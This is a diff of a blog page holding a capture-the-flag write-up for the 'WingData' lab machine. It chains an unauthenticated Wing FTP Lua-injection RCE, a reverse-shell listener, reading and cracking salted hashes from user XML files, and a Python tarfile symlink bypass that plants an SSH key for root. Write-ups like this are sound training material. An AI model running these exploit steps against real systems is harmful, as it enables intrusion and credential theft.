@@ -103,33 +103,33 @@
         <div class="post-body">
           <blockquote><p><strong>OS</strong>: Linux | <strong>Difficulty</strong>: Medium | <strong>IP</strong>: 10.129.244.106 <strong>Started</strong>: 2026-05-09 | <strong>Rooted</strong>: 2026-05-09 | <strong>Status</strong>: Completed</p></blockquote>
 <hr>
-<h2 id="summary">Summary</h2>
+<h2 id="summary">Summary<a class="heading-anchor" href="#summary" aria-label="Permalink to this section">#</a></h2>
 <p>WingData is a Linux box running Apache with a Wing FTP Server v7.4.3 behind a virtual host. The FTP web interface is vulnerable to CVE-2025-47812 (unauthenticated RCE via NULL byte Lua injection), which gives a shell as <code>wingftp</code>. From there, user credentials are extracted from Wing FTP's XML config files and cracked using the application's static salt (<code>WingFTP</code>), yielding SSH access as <code>wacky</code>. Privilege escalation exploits a sudo-permitted Python backup restore script that uses <code>tarfile.extractall(filter=&quot;data&quot;)</code> — vulnerable to CVE-2025-4138/CVE-2025-4517 (PATH_MAX symlink bypass) — to write an SSH public key to <code>/root/.ssh/authorized_keys</code>.</p>
 <hr>
-<h2 id="reconnaissance">Reconnaissance</h2>
-<h3 id="port-scan">Port Scan</h3>
+<h2 id="reconnaissance">Reconnaissance<a class="heading-anchor" href="#reconnaissance" aria-label="Permalink to this section">#</a></h2>
+<h3 id="port-scan">Port Scan<a class="heading-anchor" href="#port-scan" aria-label="Permalink to this section">#</a></h3>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">sudo nmap -Pn -p- -sC -sV -T4 10.129.244.106
 </code></pre></div>
 <table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody><tr><td>22</td><td>SSH</td><td>OpenSSH 9.2p1 Debian</td></tr><tr><td>80</td><td>HTTP</td><td>Apache 2.4.66 (Debian)</td><td>Redirects to <code>http://wingdata.htb/</code></td></tr></tbody></table>
 <p>Only two ports open. The HTTP redirect to <code>wingdata.htb</code> tells us we need to set <code>/etc/hosts</code> before doing any web enumeration.</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">echo &quot;10.129.244.106 wingdata.htb&quot; | sudo tee -a /etc/hosts
 </code></pre></div>
-<h3 id="virtual-host-discovery">Virtual Host Discovery</h3>
+<h3 id="virtual-host-discovery">Virtual Host Discovery<a class="heading-anchor" href="#virtual-host-discovery" aria-label="Permalink to this section">#</a></h3>
 <p>The main site at <code>wingdata.htb</code> is a static corporate page. A "Client Portal" link in the navigation points to <code>ftp.wingdata.htb</code>. Confirmed via vhost fuzzing with ffuf — <code>ftp</code> returned a 404 (distinct from the default 301), indicating a configured vhost:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ffuf -u http://wingdata.htb -H &quot;Host: FUZZ.wingdata.htb&quot; \
   -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 301
 </code></pre></div>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">echo &quot;10.129.244.106 ftp.wingdata.htb&quot; | sudo tee -a /etc/hosts
 </code></pre></div>
-<h3 id="service-identification">Service Identification</h3>
+<h3 id="service-identification">Service Identification<a class="heading-anchor" href="#service-identification" aria-label="Permalink to this section">#</a></h3>
 <p>Browsing to <code>http://ftp.wingdata.htb/login.html</code> reveals <strong>Wing FTP Server v7.4.3</strong> (visible in the page footer). This version is vulnerable to CVE-2025-47812 — unauthenticated RCE.</p>
 <hr>
-<h2 id="foothold-cve-2025-47812-wing-ftp-unauthenticated-rce">Foothold — CVE-2025-47812 (Wing FTP Unauthenticated RCE)</h2>
+<h2 id="foothold-cve-2025-47812-wing-ftp-unauthenticated-rce">Foothold — CVE-2025-47812 (Wing FTP Unauthenticated RCE)<a class="heading-anchor" href="#foothold-cve-2025-47812-wing-ftp-unauthenticated-rce" aria-label="Permalink to this section">#</a></h2>
 <blockquote><p><strong>Type</strong>: Remote, Unauthenticated · <strong>CVE</strong>: <a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47812" target="_blank" rel="noopener noreferrer">CVE-2025-47812</a> · <strong>Service</strong>: Wing FTP Server 7.4.3</p></blockquote>
-<h3 id="how-it-works">How It Works</h3>
+<h3 id="how-it-works">How It Works<a class="heading-anchor" href="#how-it-works" aria-label="Permalink to this section">#</a></h3>
 <p>Wing FTP Server versions ≤ 7.4.3 have a discrepancy between two internal functions:</p>
 <ol><li><code>c_CheckUser()</code> uses <code>strlen()</code> on the username, which truncates at a NULL byte (<code>%00</code>). Authentication passes for the portion before the NULL — in this case, <code>anonymous</code>.</li><li>Session file creation uses the full unsanitised username, including everything after the NULL byte.</li><li>Since session files are stored as Lua scripts, injecting Lua code after the NULL byte writes executable code into the session file.</li><li>When <code>/dir.html</code> is accessed with the resulting session cookie, <code>SessionModule.load()</code> calls <code>loadfile()</code> → <code>f()</code> on the session file, executing the injected Lua code as the <code>wingftp</code> user.</li></ol>
-<h3 id="exploitation">Exploitation</h3>
+<h3 id="exploitation">Exploitation<a class="heading-anchor" href="#exploitation" aria-label="Permalink to this section">#</a></h3>
 <p>Using the public PoC (<a href="https://www.exploit-db.com/exploits/52347" target="_blank" rel="noopener noreferrer">Exploit-DB 52347</a>):</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ -c &quot;whoami&quot; -v
 </code></pre></div>
@@ -153,7 +153,7 @@ wftp_default_ssl.crt
 wftp_default_ssl.key
 wftpserver
 </code></pre></div>
-<h3 id="reverse-shell">Reverse Shell</h3>
+<h3 id="reverse-shell">Reverse Shell<a class="heading-anchor" href="#reverse-shell" aria-label="Permalink to this section">#</a></h3>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash"># Listener
 nc -lvnp 9001
 
@@ -166,8 +166,8 @@ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb/ \
 export TERM=xterm
 </code></pre></div>
 <hr>
-<h2 id="lateral-movement-wingftp-wacky">Lateral Movement — wingftp → wacky</h2>
-<h3 id="credential-discovery">Credential Discovery</h3>
+<h2 id="lateral-movement-wingftp-wacky">Lateral Movement — wingftp → wacky<a class="heading-anchor" href="#lateral-movement-wingftp-wacky" aria-label="Permalink to this section">#</a></h2>
+<h3 id="credential-discovery">Credential Discovery<a class="heading-anchor" href="#credential-discovery" aria-label="Permalink to this section">#</a></h3>
 <p>As <code>wingftp</code>, the Wing FTP data directory is readable:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ls /opt/wftpserver/Data/1/users/
 </code></pre></div>
@@ -179,13 +179,13 @@ export TERM=xterm
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>wacky:x:1001:1001::/home/wacky:/bin/bash
 </code></pre></div>
 <p><code>wacky</code> is both a Wing FTP user and a system user with a home directory and bash shell.</p>
-<h3 id="hash-extraction">Hash Extraction</h3>
+<h3 id="hash-extraction">Hash Extraction<a class="heading-anchor" href="#hash-extraction" aria-label="Permalink to this section">#</a></h3>
 <p>From <code>wacky.xml</code>:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-xml">&lt;UserName&gt;wacky&lt;/UserName&gt;
 &lt;Password&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/Password&gt;
 </code></pre></div>
 <p>64-character hex string → SHA-256.</p>
-<h3 id="finding-the-salt">Finding the Salt</h3>
+<h3 id="finding-the-salt">Finding the Salt<a class="heading-anchor" href="#finding-the-salt" aria-label="Permalink to this section">#</a></h3>
 <p>Initial attempt to crack as plain SHA-256 (<code>hashcat -m 1400</code>) failed against rockyou.txt. The application's domain settings reveal the salt configuration:</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">cat /opt/wftpserver/Data/1/settings.xml
 </code></pre></div>
@@ -193,7 +193,7 @@ export TERM=xterm
 &lt;SaltingString&gt;WingFTP&lt;/SaltingString&gt;
 </code></pre></div>
 <p>Wing FTP uses a <strong>static, hardcoded salt</strong> (<code>WingFTP</code>) for all users. The hashing algorithm is <code>SHA256(password + salt)</code>.</p>
-<h3 id="cracking">Cracking</h3>
+<h3 id="cracking">Cracking<a class="heading-anchor" href="#cracking" aria-label="Permalink to this section">#</a></h3>
 <p>Format the hash file as <code>hash:salt</code> and use hashcat mode 1410 (<code>sha256($pass.$salt)</code>):</p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">printf &#x27;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP&#x27; &gt; hash.txt
 hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt --force
@@ -203,32 +203,32 @@ hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt --force
 john --format=dynamic_62 --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
 </code></pre></div>
 <p><strong>Cracked</strong>: <code>!#7Blushing^*Bride5</code></p>
-<h3 id="ssh-access">SSH Access</h3>
+<h3 id="ssh-access">SSH Access<a class="heading-anchor" href="#ssh-access" aria-label="Permalink to this section">#</a></h3>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ssh wacky@wingdata.htb
 # Password: !#7Blushing^*Bride5
 </code></pre></div>
 <hr>
-<h2 id="user-flag">User Flag</h2>
+<h2 id="user-flag">User Flag<a class="heading-anchor" href="#user-flag" aria-label="Permalink to this section">#</a></h2>
 <blockquote><p>User flag: <code>7923263667011b58aac75a0e7d45e6d3</code></p></blockquote>
 <hr>
-<h2 id="privilege-escalation-cve-2025-4138-tarfile-path-max-bypass">Privilege Escalation — CVE-2025-4138 (tarfile PATH_MAX Bypass)</h2>
-<h3 id="sudo-permissions">Sudo Permissions</h3>
+<h2 id="privilege-escalation-cve-2025-4138-tarfile-path-max-bypass">Privilege Escalation — CVE-2025-4138 (tarfile PATH_MAX Bypass)<a class="heading-anchor" href="#privilege-escalation-cve-2025-4138-tarfile-path-max-bypass" aria-label="Permalink to this section">#</a></h2>
+<h3 id="sudo-permissions">Sudo Permissions<a class="heading-anchor" href="#sudo-permissions" aria-label="Permalink to this section">#</a></h3>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">wacky@wingdata:~$ sudo -l
 </code></pre></div>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>User wacky may run the following commands on wingdata:
     (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
 </code></pre></div>
-<h3 id="analysing-the-script">Analysing the Script</h3>
+<h3 id="analysing-the-script">Analysing the Script<a class="heading-anchor" href="#analysing-the-script" aria-label="Permalink to this section">#</a></h3>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">cat /opt/backup_clients/restore_backup_clients.py
 </code></pre></div>
 <p>Key observations:</p>
 <ul><li>Reads tar files from <code>/opt/backup_clients/backups/</code></li><li>Filename must match <code>backup_&lt;digits&gt;.tar</code></li><li>Extracts using <code>tarfile.extractall(path=staging_dir, filter=&quot;data&quot;)</code></li><li>The <code>filter=&quot;data&quot;</code> is the vulnerable line</li></ul>
-<h3 id="python-version-check">Python Version Check</h3>
+<h3 id="python-version-check">Python Version Check<a class="heading-anchor" href="#python-version-check" aria-label="Permalink to this section">#</a></h3>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">python3 --version
 # Python 3.12.3
 </code></pre></div>
 <p>Python 3.12.3 is vulnerable to CVE-2025-4138/CVE-2025-4517 — a PATH_MAX overflow in <code>os.path.realpath()</code> that bypasses the <code>filter=&quot;data&quot;</code> safety check. When the resolved symlink path exceeds 4096 bytes (Linux PATH_MAX), <code>realpath()</code> silently stops resolving and falls back to string manipulation, allowing symlinks to escape the extraction directory.</p>
-<h3 id="exploitation">Exploitation</h3>
+<h3 id="exploitation">Exploitation<a class="heading-anchor" href="#exploitation" aria-label="Permalink to this section">#</a></h3>
 <p><strong>Step 1 — Generate SSH keypair on the box:</strong></p>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code class="language-bash">ssh-keygen -t ed25519 -f /tmp/key -N &quot;&quot;
 </code></pre></div>
@@ -262,13 +262,13 @@ ssh -i key root@wingdata.htb
 root
 </code></pre></div>
 <hr>
-<h2 id="root-flag">Root Flag</h2>
+<h2 id="root-flag">Root Flag<a class="heading-anchor" href="#root-flag" aria-label="Permalink to this section">#</a></h2>
 <blockquote><p>Root flag: <code>4c62af7b8d9976a4f96a9b9630ee039c</code></p></blockquote>
 <hr>
-<h2 id="credentials-collected">Credentials Collected</h2>
+<h2 id="credentials-collected">Credentials Collected<a class="heading-anchor" href="#credentials-collected" aria-label="Permalink to this section">#</a></h2>
 <table><thead><tr><th>Username</th><th>Password / Hash</th><th>Where Found</th><th>Where Used</th></tr></thead><tbody><tr><td>anonymous</td><td>(no password)</td><td>Wing FTP default</td><td>CVE-2025-47812 exploit</td></tr><tr><td>wacky</td><td><code>!#7Blushing^*Bride5</code></td><td><code>/opt/wftpserver/Data/1/users/wacky.xml</code></td><td>SSH login</td></tr><tr><td>admin (WingFTP)</td><td><code>a8339f8e...</code> (SHA-256+salt, uncracked)</td><td><code>Data/_ADMINISTRATOR/admins.xml</code></td><td>Not needed</td></tr></tbody></table>
 <hr>
-<h2 id="attack-chain">Attack Chain</h2>
+<h2 id="attack-chain">Attack Chain<a class="heading-anchor" href="#attack-chain" aria-label="Permalink to this section">#</a></h2>
 <div class="code-block"><button class="copy-btn" aria-label="Copy code">copy</button><pre><code>Nmap → port 80 (Apache) → redirect to wingdata.htb
   │
   ▼
@@ -298,7 +298,7 @@ Malicious tar (PATH_MAX symlink bypass) → write SSH key to /root/.ssh/authoriz
 SSH as root → root flag
 </code></pre></div>
 <hr>
-<h2 id="references">References</h2>
+<h2 id="references">References<a class="heading-anchor" href="#references" aria-label="Permalink to this section">#</a></h2>
 <ul><li><a href="https://www.exploit-db.com/exploits/52347" target="_blank" rel="noopener noreferrer">CVE-2025-47812 — Wing FTP Server Unauthenticated RCE</a></li><li><a href="https://github.com/thefizzyfish/CVE-2025-4138_tarfile_filter_bypass" target="_blank" rel="noopener noreferrer">CVE-2025-4138 — Python tarfile PATH_MAX Symlink Bypass</a></li><li><a href="https://www.wftpserver.com/help/ftpserver/compression.htm" target="_blank" rel="noopener noreferrer">Wing FTP Server Password &amp; Security Settings</a></li></ul>
         </div>
 
